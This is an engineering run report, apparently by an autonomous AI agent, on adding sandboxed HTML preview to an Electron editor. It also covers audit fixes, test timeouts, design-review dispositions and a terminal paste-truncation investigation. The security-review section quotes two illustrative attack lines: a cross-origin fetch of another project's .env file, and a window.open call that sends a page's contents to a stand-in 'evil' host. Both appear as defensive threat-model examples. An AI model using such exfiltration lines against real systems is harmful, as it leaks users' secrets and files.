# Run report — HTML document viewing

**Date:** 2026-09-18 · **Status:** in progress · **Conductor:** Opus 5 (1M), autonomous

This file is the evidence the spec's §2 table cites. It is written as the run proceeds, not
at the end, so a claim always has a record behind it.

---

## Phase 0 — grounding

**The gate was red before any feature work**, at `ca4b92e` (`0.38.0`).

| | Result |
|---|---|
| `npm run verify` at `ca4b92e` | **exit 1** — failed at `npm run audit` |
| Cause | `js-yaml` 4.3.1 < 4.3.2, GHSA-2883-xcg3-v3hh, CVSS 7.5 (CPU exhaustion via `maxTotalMergeKeys`), transitive through `electron-builder` and `electron-updater` |
| Fix | `npm audit fix` → js-yaml 4.3.2, `@vitest/mocker` 4.1.10 → 4.1.11. Lockfile only |
| Left in place | 2 moderate (dompurify via monaco-editor) — need a monaco major bump, do not trip `--audit-level=high` |
| `npm run verify` after | **exit 0** at `f00a90c` |

**A second, separate problem surfaced on the re-run:** `test/unit/file-service-scope.test.ts >
reports a conflicted path as unmerged rather than a whole-file deletion` failed with
`Test timed out in 5000ms` (5071 ms), then passed on a clean re-run alone (file total 4.93 s).

Six unit suites (`file-service-scope`, `git-actions-integration`, `git-history`, `git-info`,
`hunk-patch-integration`, `project-info-untracked`) build scratch repos and shell out to real
`git` — dozens of process spawns each. Vitest runs test files in parallel, so under full-suite
load a sub-second suite crosses the 5 s default and trips it as a *timeout*, not a failed
assertion. `testTimeout` raised to 20 s in `vitest.config.ts`, fixing the cause for all six
rather than the one that lost the race.

**Risk accepted and recorded:** a genuinely hung test now takes 20 s to fail instead of 5 s. No
assertion budget changed — a timeout is a liveness bound, not a coverage one. Commit `f00a90c`.

---

## Measured baseline — what Conduit does today

Throwaway probe in the scratchpad (never a repo artifact), driving the **real built app** under
Playwright-Electron via `test/e2e/harness.mjs`. Fixture repo in a temp dir containing
`report.html` (linking `./assets/style.css` and `./assets/app.js`) and `readme.md`; opened by
clicking the row in the Files tree, exactly as a user would.

```json
[
  { "id": "M1", "claim": "opening report.html: which surface mounts",
    "value": { "monaco": true, "viewerControls": false, "viewerToggleLabels": [],
               "webviewFrame": false, "docpageClass": false,
               "tabTitles": ["report.html"] } },

  { "id": "M2", "claim": "opening readme.md: markdown parity target",
    "value": { "monaco": false, "viewerControls": true,
               "controlLabels": ["View source"], "docpageClass": true,
               "renderedHeading": "Markdown heading" } },

  { "id": "M3", "claim": "editor-tab context menu items for an .html tab",
    "value": ["Keep Open", "Close", "Close others", "Close to the right",
              "Close to the left", "Close all", "Copy path", "Copy name",
              "Reveal in Explorer", "Open in browser"] },

  { "id": "M4", "claim": "web prompt given file:///…/report.html",
    "value": { "modalStillOpen": true, "webviewFrames": 0, "tabTitles": ["readme.md"] } }
]
```

**Readings.** M1: an HTML file gets Monaco and nothing else — no viewer chrome, no rendered
surface, and the panel does not take the `.docpage` document treatment that M2 shows Markdown
does. M3: the HTML affordance that exists today sits *last*, after `Reveal in Explorer`, and its
justifying comment in `webview/app.tsx:1842-1843` says HTML "has no faithful in-editor render" —
the statement this feature exists to falsify. M4: a `file://` URL in the in-app browser is
refused **silently** — the modal simply stays open and nothing tells the user why.

---

## Spike — can a test observe the inside of a `<webview>` guest?

Three of the planned slice checks assert things that only exist *inside* the guest (a computed
colour from the page's own stylesheet, a marker the page's own script writes). Asserting from
the host DOM would pass against a guest that rendered nothing — precisely the failure mode this
run exists to catch — so the capability was proven **before** planning around it, against the
existing http web-view path so the spike depended on nothing being built.

Route: `app.evaluate` in the **main process** → `webContents.getAllWebContents()` → the entry
whose `getType() === 'webview'` → `executeJavaScript`.

```json
{ "kinds": [ { "type": "webview", "url": "http://127.0.0.1:49983/" },
             { "type": "window",  "url": "file:///G:/awby/projects/conduit/out/index.html" } ],
  "reached": true,
  "probe": { "heading": "inside the guest",
             "color": "rgb(102, 51, 153)",
             "scripted": "yes",
             "flag": true,
             "title": "Guest Reach Spike" } }
```

**Verdict: reachable.** Computed style, script side effects, dataset mutations and
`document.title` all observable. The e2e checks can be honest.

---

## Spec review — revision 1 → revision 2

An independent reviewer read revision 1 against the spec template's criteria and the codebase.
It returned 2 blockers, 7 high, 9 medium, 8 low. Disposition:

| Finding | Verdict | What changed |
|---|---|---|
| **B1** Preview has unrestricted network access; scripts enabled with no network policy | **Accepted — the most serious hole** | Network blocked by default in the preview partition, with a per-tab allow-bar naming the host, mirroring the Markdown remote-image gate. Remote navigation always routed to the system browser |
| **B2** `protocol.handle` error statuses are invisible to a `<webview>`, so every error state had no detection path | **Accepted** | New host precheck `html:canPreview(path)` returning a typed reason; the viewer renders the state and only then sets `src`. The handler keeps its statuses as defence in depth for sub-resources |
| **B3** `registerSchemesAsPrivileged` never mentioned; without `standard:true` relative resolution — the URL shape's whole justification — does not work | **Accepted for the spec** (the plan already had it) | Registration and its pre-`app.ready` ordering written into §3 as mandatory |
| **H4** INV-3 round-trip identity unsatisfiable (host case-folds; `\` vs `/`) | **Accepted** | INV-3 restated as canonical round-trip |
| **H5** INV-1's `isInsideAnyRoot` is purely lexical — catches `../..`, not symlinks | **Accepted** | INV-1 now requires `isInsideAnyRoot` **and** `realPathLeaf`, as `fs-dnd`/`fs-import` do |
| **H6** `ShortcutAction.defaultCombo` is required; "no default combo" contradicts the type | **Accepted** | `Mod+Shift+H` bound. `Mod+Shift+V` checked and rejected — `Ctrl+Shift+V` is terminal paste |
| **H7** `isHtmlDocPath` in `src/media-kind.ts` breaks the webview typecheck (not in `tsconfig.webview.json`'s `include`) | **REJECTED — measured false** | The renderer already imports ~30 `src/*` modules absent from that list and typecheck is green; TS adds imports transitively. The real constraint nearby is the **esbuild** browser bundle having no node shims — now INV-6. Placement stands |
| **H8** The cited evidence file didn't exist | **Accepted** | This file |
| **H9** Find-in-page in Vision, though Markdown ships one and the job is "read a report" | **Accepted** | Promoted to v1 |
| **H10** Electron guests have no default context menu — right-click would do nothing | **Accepted** | Host-installed `context-menu` handler on preview guests, content-menu idiom |
| **M11** Sub-resource changes never trigger reload | **Accepted as a limitation** | Documented in §4/§13; `Reload` is a first-class control |
| **M12** Reload discards scroll | **Accepted** | Scroll captured and restored across reload |
| **M13** `Open in default browser` is a promise `shell.openPath` can't keep, and collides with `Open externally` | **Accepted** | One honest label everywhere: `Open externally` |
| **M14** Editor-tab menu's frozen close-first order silently rewritten | **Accepted** | No amendment; the new rows go where `Open in browser` already sits |
| **M15** Two acceptance criteria vacuous ("still passes" after editing the test's own expectation) | **Accepted** | Both restated to assert the new expected allowlist / order |
| **M16** Guest-internal assertions had no demonstrated observation mechanism | **Accepted** | Proven by the spike above, before planning |
| **M17** Source half's dirty/save lifecycle undefined | **Accepted** | Preview renders disk; a dirty-buffer notice with `Save and reload`; existing dirty protection untouched |
| **M18/M19** Missing §8 and §9 rows | **Accepted** | Page-level error, dirty/saving, degraded; settings control, palette gating, guest menu, `Open source`, Markdown-link route |
| **M20** "Escape returns focus" asserted with no mechanism — a keyboard trap | **Accepted** | `before-input-event` on the guest, named in §10 |
| **L21** `plural()` would render "8 MBs" | **Accepted** | `Intl.NumberFormat`, and the spec says why not `plural()` |
| **L22/L23/L24** Heading overclaim, line budget, palette `HTML:` prefix | **Accepted** | All corrected |
| **L26** Unbounded guest processes | **Accepted** | Only the active HTML doc's guest stays mounted |
| **L28** `target="_blank"` to a sibling local page dies silently | **Accepted** | Preview guests get their own window-open handler |

The review paid for itself twice over: B1 and B2 would both have shipped.

---

## Shipped

_(to be filled as slices land)_

## Blocked / needs-human-smoke

_(none yet)_

---

## Architecture review of the plan — two security defects in my own design

An architecture critic read the plan against the Electron 43.3.0 typings on disk. Electron
surface was ~85% right; two design-level defects and one overclaim were not.

**F19 — volume-as-origin. The serious one.** The URL shape I chose,
`conduit-preview://g/awby/proj-a/report.html`, makes the **entire `G:` drive a single web
origin**. A previewed page could therefore `fetch('conduit-preview://g/other-project/.env')`,
be same-origin, pass the root check, and read it. Every file in every open workspace root
would have been readable by any previewed page — including a page an agent wrote, which the
spec names as an actor. Spec §1's promise "nothing outside the opened workspace roots can be
read" was technically true and materially misleading.

**Fix, and it makes the module smaller:** the host becomes an **opaque per-root token**,
`conduit-preview://<rootToken>/<path-relative-to-root>`, with a per-run `token → root` table
in the main process. Each workspace root is then its own origin, and the browser refuses a
cross-root read before our handler is ever consulted. It also deletes `pathShape`, the
drive/UNC/posix branching, the `localhost` special case and the `process.platform` hazard
from `src/preview-url.ts` entirely. Caught while Slice 1 was mid-flight; the executor was
redirected before the wrong design was committed.

**F18 — `openExternalUrl` is an unmetered exfiltration channel.** Routing a preview guest's
`http(s)` navigations and popups to `shell.openExternal(url)` ships the **full URL, query
string included**. `window.open('https://evil/?d=' + btoa(document.documentElement.outerHTML))`
would have opened the user's real browser and posted the payload, with no allow-bar, because
nothing was *blocked*. `HandlerDetails` carries no user-gesture flag, so a click and a script
are indistinguishable. Fix: a preview guest's external opens go through the same allow gate as
a blocked resource.

**Per-doc allow flag vs one global session.** `session.fromPartition()` returns one
process-global session and accepts one `onBeforeRequest` listener; Conduit is multi-window.
So "allow lifts the block for that tab only" was unimplementable — allowing report A in
window 1 would have unblocked report B in window 2, and the allow-bar would have broadcast to
every window. Fix: key the flag on `webContentsId` (which `OnBeforeRequestListenerDetails`
already carries) and route the notice via `contents.hostWebContents` to one window.

Verified independently before acting, in `node_modules/electron/electron.d.ts`:
`WebviewTag` **does** expose a DOM `context-menu` event (so the host round-trip I planned is
dead weight — two IPC messages deleted), and there is **no** `crashed` event on it, only
`render-process-gone`. My planned crashed-state would never have rendered.

---

## Paste truncation — investigation result

**Conduit's Ctrl+V path contains no cap, no slice and no chunking.** Traced end to end:
capture-phase keydown (`terminal-pane.tsx:848`, `:861-875`) → `navigator.clipboard.readText()`
→ `term.paste(text)` (`:778-789`) → xterm wraps the whole string in one
`ESC[200~ … ESC[201~` and fires **one** `onData` → `post({type:'term:input'})`
(`terminal-pane.tsx:537`) → `ipcMain 'to-host'` (`main.ts:3201`) → `pty.input()`
(`main.ts:3042-3046`) → `proc.write(data)`.

**The single suspect line is `src/pty-host.ts:182` — `proc.write(data)`.** It is unchunked,
unpaced, its return value cannot report a short write, and node-pty's `handleFlowControl`
(available at `@lydell/node-pty-win32-x64/lib/terminal.js:75-88`) is deliberately not enabled
by the spawn options at `src/pty-host.ts:107-115`. The write lands on a `net.Socket` over the
ConPTY **conin** pipe, so Node itself buffers rather than dropping — but the bytes then reach
ConPTY in libuv-sized fragments spread across event-loop turns, uncoordinated with what the
child is draining. That is the documented ConPTY large-paste failure shape, and it is why
Windows Terminal chunks pasted input deliberately instead of issuing one write.

**There is no regression window in Conduit.** Last touches: `terminal-clipboard.ts` and
`terminal-bus.ts` 2026-08-28, `pty-host.ts` 2026-08-28, `terminal-pane.tsx` 2026-09-03
(OSC 8 links, output side). So this is either an environment change or a latent bug the user
only just hit with a large enough paste.

**Test coverage stops far short of the problem.** `test/e2e/paste.e2e.mjs` is the only real
paste test; its payload (`:74`) is 25 lines × 27 chars ≈ **704 bytes**, and its reader records
only `has200`/`has201` booleans, never a byte count — so it cannot localise a partial loss.
Nothing in the repo exercises a large terminal payload.

**Ruled out with evidence:** the IPC hop (no cap in `preload.ts:20-22` / `main.ts:3201`; Mojo
drops whole messages, never truncates one); the scrollback ring and `TAIL_BYTES` (both fed
only from `proc.onData` — output side); any renderer `slice`/`substring` (exhaustive search).

**Not yet ruled out, and cheap to exclude:** `MAX_MESSAGE_CHARS = 2000` with
`.replace(/\s+/g,' ')` at `src/timed-messages.ts:67,:115` is a real hard truncation ending at
`pty.input()`, and 2000 chars is plausibly "a page-long to-do list". It is unreachable from
Ctrl+V — it only fires for a *scheduled* timed message — so it is excluded if the user pasted
with Ctrl+V, which is the assumption being carried forward.

**Measurement designed, not yet run** (deferred until the machine is quiet — a loaded box
fails PTY e2es the way a broken PTY does): instrument four points and compare lengths —
`terminal-pane.tsx:537` (what xterm produced), `main.ts:3043` (IPC hop), `pty-host.ts:182`
(what we wrote), and a far-end reader counting received bytes. Sweep line count at fixed bytes
(25 → 1000 lines) and bytes at fixed line count (1 KB → 64 KB), bracketing 4096, 8192 and
65536 (the Node stream `highWaterMark`, the first size at which `socket.write()` returns false
and the data starts spreading across turns). Line count is the likelier driver: every `\n`
becomes a `\r`, and on Windows each `\r` is its own console INPUT_RECORD.
